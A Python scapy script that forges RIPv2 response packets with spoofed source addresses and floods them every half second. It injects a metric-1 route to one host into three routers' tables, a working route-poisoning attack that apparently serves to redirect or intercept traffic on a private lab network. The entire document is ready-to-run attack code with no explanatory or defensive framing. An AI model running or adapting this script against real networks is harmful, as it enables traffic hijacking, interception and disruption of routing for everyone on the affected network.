#!/usr/bin/python3

import string
from scapy.all import *
import signal
import threading
import time
import logging
import sys
import re
import scapy.layers.http
import time

signal.signal(signal.SIGINT, lambda s, f: sys.exit(-1))	

ripmaker = lambda target, dst, via: IP(src=via,dst=target)/UDP(dport=520,sport=520)/RIP(version=2,cmd=2)/RIPEntry(AF=2,addr=dst,mask="255.255.255.252",metric=1)

packages = []
packages.append(ripmaker("192.168.220.18", "192.168.220.136", "192.168.220.134"))
packages.append(ripmaker("192.168.220.21", "192.168.220.136", "192.168.220.18"))
packages.append(ripmaker("192.168.220.141", "192.168.220.136", "192.168.220.21"))

while True:
	send(packages, verbose=0)
	time.sleep(0.5)
